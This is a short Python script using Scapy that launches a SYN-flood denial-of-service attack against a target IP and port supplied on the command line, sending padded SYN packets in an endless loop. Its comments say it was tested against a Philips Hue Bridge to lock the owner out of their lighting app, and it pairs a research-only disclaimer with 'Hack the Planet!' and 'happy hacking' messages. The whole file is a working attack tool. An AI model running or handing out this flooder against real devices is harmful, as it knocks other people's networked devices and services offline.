from scapy.all import *
import argparse
import time



### Successfully tested against Phillips Hue Bridge, when used against hue, the user is unable to access their Hue app and therfore cannot make any changes to their lights.
### IoT have been vulnerable since the very beginning, and Syn Flood Attacks are very difficult to stop, so a Syn Flood DoS against an under powered IoT device is almost always going to end up causing some sort of denial of service.
### DO NOT USE THIS AGAINST ANY DEVICE YOU DO NOT OWN, THIS IS FOR RESEARCH PURPOSES ONLY! 
### With that being said, Hack the Planet! ;)


#                        _.-**-._
#                     _,(        ),_
#                  .-"   '-^----'   "-.
#               .-'                    '-.
#             .'                          '.
#           .'    __.--**'""""""'**--.__    '.
#          /_.-*"'__.--**'""""""'**--.__'"*-._\
#         /_..-*"'   .-*"*-.  .-*"*-.   '"*-.._\
#        :          /       ;:       \          ;
#        :         :     *  !!  *     :         ;
#         \        '.     .'  '.     .'        /
#          \         '-.-'      '-.-'         /
#       .-*''.                              .'-.
#    .-'      '.                          .'    '.
#   :           '-.        _.._        .-'        '._
#  ;"*-._          '-._  --___ `   _.-'        _.*'  '*.
# :      '.            `"*-.__.-*"`           (        :
#  ;      ;                 *|                 '-.     ;
#   '---*'                   |                    ""--'
#    :                      *|                      :
#    '.                      |                     .'
#      '.._                 *|        ____----.._-'
#       \  """----_____------'-----"""         /
#        \  __..-------.._        ___..---._  /
#        :'"              '-..--''          "';
#         '""""""""""""""""' '"""""""""""""""'
#                 Respect my Authoritah!


parser = argparse.ArgumentParser()

parser.add_argument('--target', '-t', type=str, required=True)
parser.add_argument('--port', '-p', type=int, required=False, default='80', help='default port is 80')



args = parser.parse_args()   

target = args.target
port = args.port 
 
tcp = TCP(sport=RandShort(), dport=port, flags="S")
raw = Raw(b"A"*1024)
ip = IP(dst=target)
p = ip / tcp / raw
bytes = raw

null = 'null' 



def DoS():
	print ('bum rushing %s using port %s \n please ignore the dots, they are normal. [CTRL + C] to Exit' % (target, port))
	time.sleep(3)
	send(p, loop=1, verbose=1)


bytes = raw 


def space():
   for count in range(5):
      print('-' * 50)

def exitMessage():   
   print('have a nice day, happy hacking!')

DoS()
space()
exitMessage()
